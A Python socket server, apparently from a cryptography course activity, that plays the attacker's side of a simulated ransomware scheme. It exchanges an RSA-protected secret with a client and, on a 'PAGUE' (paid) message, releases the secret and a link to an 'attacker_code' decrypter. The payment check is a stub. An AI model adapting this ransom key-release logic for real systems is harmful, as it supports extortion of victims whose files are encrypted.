import socket
from rsa import RSA
import random
import os
HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
PORT = 65432  # Port to listen on (non-privileged ports are > 1023)

def checkIfPayed():
    #Lo dejo implementado asi porque esta fuera de la actividad, pero aqui chequearia el balance y los pagos de su cuenta
    return True

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    while True:
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            data = conn.recv(10240)
            print(str(data))
            if str(data) == "b'PAGUE'":
                print("el cliente pago, enviamos la data")
                #Manda funcion y x
                #https://www.youtube.com/watch?v=hAAlDoAtV7
                x = ""
                with open("x.txt", "r") as xfile:
                    x = xfile.read()
                message = bytes("x=" + x + " funcion=https://github.com/DiSilvioRiccardo/actividad2-crypto-fr/blob/main/attacker_code/file_decrypter.py", encoding = "utf-8")
                conn.sendall(message)

            elif str(data).startswith("b'x"):
                print("recibida x")
                if os.path.exists("x.txt"):
                    os.remove("x.txt")

                #https://www.youtube.com/watch?v=hAAlDoAtV7Y
                with open("x.txt", "w+") as xfile:
                    print(str(data))
                    xfile.write(str(data)[4:-1])
            else:
                print("generando secreto compartido")
                split = str(data).replace("(", "").replace(")", "").replace(" ", "").replace("b", "").replace("'", "").split(",")
                n = int(split[0])
                e = int(split[1])
                pk = (n, e)
                
                x = random.randint(0, n - 1)
                y=RSA().Frsa(pk,x) ## 10^65537 mod 508163791655810547190783791025718998434756167139201407767392169735303733732399526528990666924772700801473372029447948216573138594307366834741754299491153220383311373768340270388549644033269769812373504740058686448871071660140601338659607593782938904025900104439967239125608937756635307273646865090719414198751937735121909206652148827594589273435746099995567347184064644628782528015220621927016614102458911870451149507265199384197454695126397777796666490556145964227681977797409280941153615416329019020820761153069249276216672972742181138935082457352682387344304476356537442137799921284548034423560535055848003864482214826069589381019354679383227549478011864234189349356105875467602960051309752160787095208324582863454610433485158851366154985359586489903766978820073909484043885323307109989626202385406138719198319223144837391187550387972626475660676676698022863215340664589768236602973706199782119882760049225154404369178209758666010668137100510136229831120464487082483887945863429317534842123942868990736466416807589069273463646435541008778769622444340692207463061257949769882759645328273792636229806515846512457733720219932274659712668008626450872101520917860987511151927548141329360918817266293087977057285652255560227699156597267
                message = bytes(str(y), encoding = "utf-8")
                conn.sendall(message)